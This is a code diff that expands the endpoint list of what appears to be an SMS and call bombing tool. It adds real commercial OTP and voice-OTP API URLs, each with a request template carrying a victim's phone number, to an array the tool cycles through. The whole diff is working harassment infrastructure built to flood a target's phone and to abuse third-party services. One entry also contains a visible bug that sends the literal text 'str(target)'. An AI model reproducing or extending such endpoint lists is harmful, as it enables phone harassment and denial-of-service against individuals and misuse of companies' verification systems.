@@ -6,6 +6,8 @@ false = "false"
 
 apidata = {
 
+"nnnow":("https://api.nnnow.com/d/api/appDownloadLink",{"phone": f"{target}"},{},"POST","true"),
+
 "Byjus":("https://mtnucleus.byjusweb.com/api/acs/v2/send-otp",{"phoneNumber":target,"page":"free-trial-classes"},{},"POST","""{"isOtpExhausted":false,"""),
 
 "Rummycircle":(f"https://www.rummycircle.com/api/fl/auth/v3/getOtp",{"mobile":target,"deviceId":"d6be3862-7659-46c0-98b9-3d13328a243c","deviceName":"","refCode":"","isPlaycircle":"false"},{},"POST",'''success":true'''),
@@ -26,14 +28,17 @@ apidata = {
 
 "zepto":("https://api.zepto.co.in/api/v1/user/customer/send-otp-ivr/",'{"mobileNumber":'+f'"{target}"'+'}',{'Host': 'api.zepto.co.in', 'accept': 'application/json', 'access-control-allow-credentials': 'true', 'x-requested-with': 'XMLHttpRequest', 'requestid': '006b9aed-23c6-4640-bb57-66070b258286', 'sessionid': 'undefined', 'appversion': '5.12.1', 'platform': 'android', 'systemversion': '10', 'source': 'PLAY_STORE', 'Content-Type': 'application/json', 'content-length': '29', 'accept-encoding': 'gzip', 'user-agent': 'okhttp/3.12.12'},"POST","OTP"),
 
-"gold":("https://api.crofarm.com/cons/consumer/otp/v1/",'{"phone":"'+target+'","is_voice_otp":1}',{},"POST",'success":true')
+"gold":("https://api.crofarm.com/cons/consumer/otp/v1/",'{"phone":"'+target+'","is_voice_otp":1}',{},"POST",'success":true'),
+
+"lona":(f"https://www.loanbaba.com/sdgpeknj/MAppService.asmx/SendOTPonCall",{"phoneNo":f"str(target)"},{"Content-Type":"application/json"},"POST","200")
+
 
 }
 
 
-
 apis = [
 
+apidata["nnnow"],
 apidata["Byjus"],
 apidata["Rummycircle"],
 apidata["Kisan"],
@@ -44,5 +49,6 @@ apidata["gold"],
 apidata["idn"],
 apidata["bikry"],
 apidata ["kingotp"],
-apidata ["zepto"]
+apidata ["zepto"],
+apidata["lona"]
 ]
